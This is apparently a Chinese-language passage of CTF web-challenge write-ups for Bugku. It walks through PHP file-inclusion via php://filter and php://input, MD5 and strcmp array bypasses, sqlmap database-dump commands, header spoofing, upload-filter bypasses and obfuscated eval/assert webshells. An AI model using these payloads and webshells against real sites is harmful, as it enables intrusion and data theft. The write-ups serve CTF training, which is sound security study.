    ?> 
</html>  
```
提交 flag:
`flag{edulcni_elif_lacol_si_siht}`

现在具体说说file=php://filter/read=convert.base64-encode/resource=index.php的含义

首先这是一个file关键字的get参数传递，php://是一种协议名称，php://filter/是一种访问本地文件的协议，/read=convert.base64-encode/表示读取的方式是base64编码后，resource=index.php表示目标文件为index.php。

通过传递这个参数可以得到index.php的源码，下面说说为什么，看到源码中的include函数，这个表示从外部引入php文件并执行，如果执行不成功，就返回文件的源码。

而include的内容是由用户控制的，所以通过我们传递的file参数，是include()函数引入了index.php的base64编码格式，因为是base64编码格式，所以执行不成功，返回源码，所以我们得到了源码的base64格式，解码即可。

如果不进行base64编码传入，就会直接执行，而flag的信息在注释中，是得不到的。

我们再看一下源码中 存在对 ../ tp data input 的过滤，其实这都是php://协议中的其他方法
## 请输入密码查看 flag
提示输入 5 位数密码,直接 Burp 抓包数字爆破
## 点击一百万次
查看网页代码,发现 JS
```js 

    var clicks=0
    $(function() {
      $("#cookie")
        .mousedown(function() {
          $(this).width('350px').height('350px');
        })
        .mouseup(function() {
          $(this).width('375px').height('375px');
          clicks++;
          $("#clickcount").text(clicks);
          if(clicks >= 1000000){ 
          	var form = $('<form action="" method="post">' +
						'<input type="text" name="clicks" value="' + clicks + '" hidden/>' +
						'</form>');
						$('body').append(form);
						form.submit();
          }
        });
    });
``` 
在 Consoles 中把 clicks 的值修改为 1e6,再点击一下得到 flag
## 备份是个好习惯
有题目名字想到备份文件 .bak 提交得到备份文件
得到源码
```php
<?php
/**
 * Created by PhpStorm.
 * User: Norse
 * Date: 2017/8/6
 * Time: 20:22
*/

include_once "flag.php";
ini_set("display_errors", 0);
$str = strstr($_SERVER['REQUEST_URI'], '?');
$str = substr($str,1);
$str = str_replace('key','',$str);
parse_str($str);
echo md5($key1);

echo md5($key2);
if(md5($key1) == md5($key2) && $key1 !== $key2){
    echo $flag."取得flag";
}
?>
```
因为是弱类型比较,可以用 MD5 碰撞,也可以用数组绕过
然后发现他过滤了 URL 中的 key
可以构造 payload:`?kkeyey1[]=1&kkeyey2[]=2` 或者 `?kkeyey1=QNKCDZO&kkeyey2=s878926199a`
至于那一串字符,仔细观察发现他是两个 `d41d8cd98f00b204e9800998ecf8427e` MD5 解密后得到 NULL
也就是没提交东西时 key1 和 key2 都是 NULL 时的 MD5 加密
## 成绩单
Sql post 注入
先 Burp 抓包,保存包到 post.txt
使用 sqlmap 注入
`py -2 sqlmap -r post.txt -P id --current-db` 爆当前数据库
`py -2 sqlmap -r post.txt -P id -D * --tables` 爆当前数据库的表
`py -2 sqlmap -r post.txt -P id -D * -T * --columns` 爆当前数据库表中的字段
`py -2 sqlmap -r post.txt -P id -D * -T * -C * --dump` 爆当前数据库表中字段的记录
得到 flag
## 秋名山老司机
要求 post 提交老司机的车速,并且页面的算式会改变
Python 写脚本
```py
import re
import requests
url='http://123.206.87.240:8002/qiumingshan/'
s=requests.Session()
source=s.get(url)
expression=re.search(r'(\d+[+\-*])+(\d+)',source.text).group() 
# 正则式匹配算式
print(expression)
result=eval(expression)
post={'value':result}
print(s.post(url,data=post).text)
```
多交几次,得到 flag
## 速度要快
查看源码,提示提交 margin,查看头,发现 flag
base64 解密,提交,不对
再次查看,发现 flag 字段已经变了
结合题目提示,写脚本
```py
import re
import base64
import requests
url='http://123.206.87.240:8002/web6/'
s=requests.Session()
source=s.get(url).headers
mid=base64.b64decode(source['flag'])
mid=mid.decode()
flag=s.post(url,{'margin': base64.b64decode((mid.split(':')[1]))}).text
print(flag)
```
得到 flag
## cookie 欺骗
打开发现 url 上有可疑的字符串
base64 解码得到 key.txt
猜测可以通过这个方法得到 index.php 的源码
line 变量就是当前文件的行数
filename 变量就是要读取的文件,不过要 base64 加密
构造 payload:`?line=2&filename=aW5kZXgucGhw` 
得到 index.php 源码第 2 行
如法炮制 Python 扒取全部源码
```py
import re
import requests
import base64
s=requests.Session()
url1='http://123.206.87.240:8002/web11/index.php?line='
url2='&filename='
ss=b'index.php'
url2+=base64.b64encode(ss).decode()
for i in range(1,20):
    print(s.get(url1+str(i)+url2).text)
```
得到 index.php 的源码
```php
<?php
error_reporting(0);
$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");
$line=isset($_GET['line'])?intval($_GET['line']):0;
if($file=='') header("location:index.php?line=&filename=a2V5cy50eHQ=");
$file_list = array(
'0' =>'keys.txt',
'1' =>'index.php',
);
if(isset($_COOKIE['margin']) && $_COOKIE['margin']=='margin'){
$file_list[2]='keys.php';
}
if(in_array($file, $file_list)){
$fa = file($file);
echo $fa[$line];
}
?>
```
分析可知,如果 cookie 设置了 margin 变量值为 margin,就将 keys.php 加到 file_list 数组中
然后如果提交的文件名在该数组中,就显示该文件的内容
由上构造 payload
```
GET /web11/index.php?line=&filename=a2V5cy5waHA= HTTP/1.1
Host: 123.206.87.240:8002
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: margin=margin
Connection: close
```
得到 flag
## never give up
打开网页,让我不要放弃... ~~(废话)~~
查看源码,看到注释 `<!--1p.html-->`
打开,发现跳转到 Bugku 的论坛
中间绝对有事!!!
`view-source:http://123.206.87.240:8006/test/1p.html` 查看 1p.html 源码
得到先是 url 编码,后 base64 编码,再 url 编码的的字符串
解码得到 php 源码
```php
<?php
if(!$_GET['id'])
{
	header('Location: hello.php?id=1');
	exit();
}
$id=$_GET['id'];
$a=$_GET['a'];
$b=$_GET['b'];
if(stripos($a,'.'))
{
	echo 'no no no no no no no';
	return ;
}
$data = @file_get_contents($a,'r');
if($data=="bugku is a nice plateform!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
{
	require("f4l2a3g.txt");
}
else
{
	print "never never never give up !!!";
}
?>
```
不知是不是出题人疏忽,直接访问 f4l2a3g.txt 就可得到 flag
但是也可以构造 payload 绕过
首先是 id 的值非空非零(别说了,我直接构造 id=0 卡了我半天)
然后 a 中不能有 . 
data 等于文件 a,这里可以用 PHP 伪协议 php://input 来绕过
b 的长度大于 5,111 加上 b 的首位能被 1114 匹配,并且 b 的首位不能是 4
这里可以用 eregi(ereg) 函数会丢掉空字节后面的东西绕过
综上,构造 payload
```
GET /test/hello.php?id=sad&a=php://input&b=%004asdfaa HTTP/1.1
Host: 123.206.87.240:8006
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=n5l7221c9hfe7tkit4ct96b6u6994uub
Connection: close
Content-Length: 26

bugku is a nice plateform!
```
得到 flag
## welcome to bugkuctf *
查看网页源码,发现部分代码
```php
$user = $_GET["txt"];  
$file = $_GET["file"];  
$pass = $_GET["password"];  
  
if(isset($user)&&(file_get_contents($user,'r')==="welcome to the bugkuctf")){  
    echo "hello admin!<br>";  
    include($file); //hint.php  
}else{  
    echo "you are not admin ! ";  
}  
```
首先可以用 PHP 伪协议 php://input 绕过审查
再用 php://filter/read=convert.base64-encode/resource= 利用 include 漏洞读取 hint.php 
base64 解密后得到 hint.php 源码
```php
<?php  
class Flag{//flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
			echo "<br>";
		return ("good");
        }  
    }  
}  
?>
```
定义了一个 Flag 类,不知有何用,但看见 flag.php 
利用 include 漏洞读取一波得到 `涓嶈兘鐜板湪灏辩粰浣爁lag鍝�` 
这是啥??懵逼
想想应该是编码问题

## 过狗一句话 
```php
<?php 
	$poc="a#s#s#e#r#t"; 
	$poc_1=explode("#",$poc); 
	$poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; 
	$poc_2($_GET['s']) 
?>
```
explode() 函数将 `$pos` 以 `#` 为界限打散装进 `$pos_1` 数组
`$pos_2` 用 `.` 将 `$pos_1` 数组连接成 `assert` 
可以执行任意代码
读取 flag
> print_r(glob('*.php')) 读取 .php 文件
> print_r(glob('*.txt')) 读取 .txt 文件
> print_r(scandir('./')) 扫描当前目录,并输出

得到 flag 的文件名
访问得 flag
## 字符？正则？
得到 php 代码
```php
<?php  
highlight_file('2.php');  
$key='KEY{********************************}';  
$IM= preg_match("/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i", trim($_GET["id"]), $match);  
if( $IM ){  
die('key is: '.$key);  
}  
?>
```
正则式匹配
构造 payload:`?id=keyakeyakey1232key:/1/akeye"`
得到 flag
## 前女友(SKCTF)
查看源码发现一个链接,访问
```php
<?php
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];
    $v3 = $_GET['v3'];
    if($v1 != $v2 && md5($v1) == md5($v2)){
        if(!strcmp($v3, $flag)){
            echo $flag;
        }
    }
}
?>
```
需要提交 3 个参数,v1 不等于 v2,MD5(v1)==MD5(v2) 
因为是弱类型比较,可以用 MD5 碰撞,也可以数组绕过
strcmp 函数比较可以用数组绕过
综上,构造 payload:`?v1=s878926199a&v2=s155964671a&v3[]=0`
 或者 `?v1[]=0&v2[]=1&v3[]=0`
 得到 flag
## login1(SKCTF)
hint: SQL 约束攻击
没有限制用户名的长度,可以进行 SQL 约束攻击
就是注册一个 admin,但是后面添加很多空格,使之超出数据库给该字段规定的长度
然后就可以用这个密码去登陆 admin,就能得到 flag
## 你从哪里来
伪造跳转地址
`Referer: https://www.google.com`
得到 flag
## md5 collision(NUPT_CTF)
MD5 碰撞
不知道 QNKCDZO  为何不行
但是 s878926199a 可以
构造 payload:`?a=s878926199a`
得到 flag
## 程序员本地网站
伪造本地 IP
`X-Forwarded-For: 127.0.0.1`
得到 flag
## 各种绕过 * 
访问得到 php 代码
```php
<?php 
highlight_file('flag.php'); 
$_GET['id'] = urldecode($_GET['id']); 
$flag = 'flag{xxxxxxxxxxxxxxxxxx}'; 
if (isset($_GET['uname']) and isset($_POST['passwd'])) { 
    if ($_GET['uname'] == $_POST['passwd']) 

        print 'passwd can not be uname.'; 

    else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&($_GET['id']=='margin')) 

        die('Flag: '.$flag); 

    else 

        print 'sorry!'; 

} 
?> 
```
提交的 id url 解码后等于 margin
sha1 加密 uname 和 passwd 后两者相等,但是两者又不能相等,可以利用数组绕过,但是不可以 sha1 碰撞,因为弱比较中字符等于字符
构造 payload
```
POST /web7/?uname[]=1&id=%6Dargin HTTP/1.1
Host: 123.206.87.240:8002
Content-Length: 14
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
Origin: http://123.206.87.240:8002
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: http://123.206.87.240:8002/web7/?uname[]=1&id=%6Dargin
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=n5l7221c9hfe7tkit4ct96b6u6994uub
Connection: close

passwd%5B%5D=2
```
得到 flag
## web8 
```php
<?php  
extract($_GET);  
if (!empty($ac))  
{  
	$f = trim(file_get_contents($fn));  
	if ($ac === $f)  
	{  
		echo "<p>This is flag:" ." $flag</p>";  
	}  
	else  
	{  
		echo "<p>sorry!</p>";  
	}  
}  
?>  
```
php://input 利用
```
GET /web8/?ac=1&fn=php://input HTTP/1.1
Host: 123.206.87.240:8002
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=n5l7221c9hfe7tkit4ct96b6u6994uub
Connection: close
Content-Length: 1

1
```
## 细心
访问发现 404 错误,然后查看源码,没有发现
以为是题挂了,就没管
后来看到一篇 Writeup,题没挂,是我挂了(让我哭一会)
404 界面只是个幌子, disearch 扫描站点,发现 robots.txt 文件,访问
有一个 resusl.php 文件,继续访问
提示说我的 IP 被标记了
还有一句 php 代码
```php
if ($_GET[x]==$password)
```
想到改本地 IP,但是提交啥?
尝试了很多,无果
Burp 爆破,得到要 GET 提交 x=admin
其实题目提示的有
得到 flag
做完不太放心,看了大佬的 Writeup 发现只需要构造 payload:`?x=admin`
就行了
## 求 Getshell
后缀名黑名单检测和类型检测

如果是 walf 严格匹配，通过修改Content-type后字母的大小写可以绕过检测，使得需要上传的文件可以到达服务器端，而服务器的容错率较高，一般我们上传的文件可以解析。然后就需要确定我们如何上传文件，这里将文件的后缀名改为.jpg和.png都不可行，在分别将后缀名修改为php2, php3, php4, php5, phps, pht, phtm, phtml（php的别名），发现只有php5没有被过滤，成功上传，得到flag
![](https://upload-images.jianshu.io/upload_images/9172841-0b4859adfbdad510.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/702/format/webp)
## 这是一个神奇的登陆框
sqlmap post 注入
按套路走,得到 flag
## flag.php
学到了很多
## 文件包含2  
右键查看源码发现有个  
`<!-- upload.php -->`  
根据提示文件包含所以上传一个jpg，内容为  
<?php  
@eval($_POST[pupil]);  
?>  
发现上传不成功，`<?`标签被过滤了所以可以使用想到可以用script标签过滤  
```javascript  
<script language=php>  
@eval($_POST[pupil]);  
</script>  
```  
发现ban了菜刀  
所以直接构造命令执行  
```javascript  
<script language=php>system("ls")</script>  
```  
和  
```javascript  
<script language=php>system("cat flagxxxx.txt")</script>  
```
<!--stackedit_data:
eyJoaXN0b3J5IjpbLTIwMzc1Mzk1NzIsNzcwNzczNDAsLTE2MT
UwMjczNDAsLTQ4NzgxOTIwNSwxMjIyMzQ2MTgsLTExNDQzMjEx
MzYsLTY5NjI4MjY0OCwtMzg2MjQ2MzQyLDE0NjIwMzg3NDgsLT
EwMDI1NzI3NzYsMjA2ODQ4ODAxNiw5Njk4MjcyMDcsMTI5NTg5
MTA5LDM3MzA0OTMzNywtMTQyODczNjc0Nyw0NjA2MTg1MzcsLT
cwNDM0MzI5OCwyMDQ1MTc3NDM4LC01NjE3OTExNjksLTkzNzUx
NjE5OV19
-->